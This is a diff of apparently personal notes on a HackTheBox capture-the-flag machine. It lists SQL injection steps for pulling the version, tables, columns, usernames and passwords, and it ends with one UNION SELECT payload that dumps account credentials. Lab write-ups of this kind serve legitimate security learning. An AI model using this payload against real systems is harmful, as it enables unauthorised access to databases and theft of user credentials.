@@ -2,26 +2,26 @@
 there was a bit of fiddling with the token
 
 confirm sqli (or at least math :D)
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp1.png]]
+![[burp1.png]]
 
 Get version
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp2.png]]
+![[burp2.png]]
 
 Get tables
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp3.png]]
+![[burp3.png]]
 
 Get columns
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp4.png]]
+![[burp4.png]]
 
 
 Get usernames
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp5.png]]
+![[burp5.png]]
 
 Get passwords
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp6.png]]
+![[burp6.png]]
 
 Prettier output
-![[InfoSec/Boxes/HackTheBox/PC (Done)/burp7.png]]
+![[burp7.png]]
 ```sql
 2 UNION SELECT 'usernames: ' || group_concat(username,', ') || ' - ' || 'passwords: ' || group_concat(password,', ') FROM accounts -- -
 ```
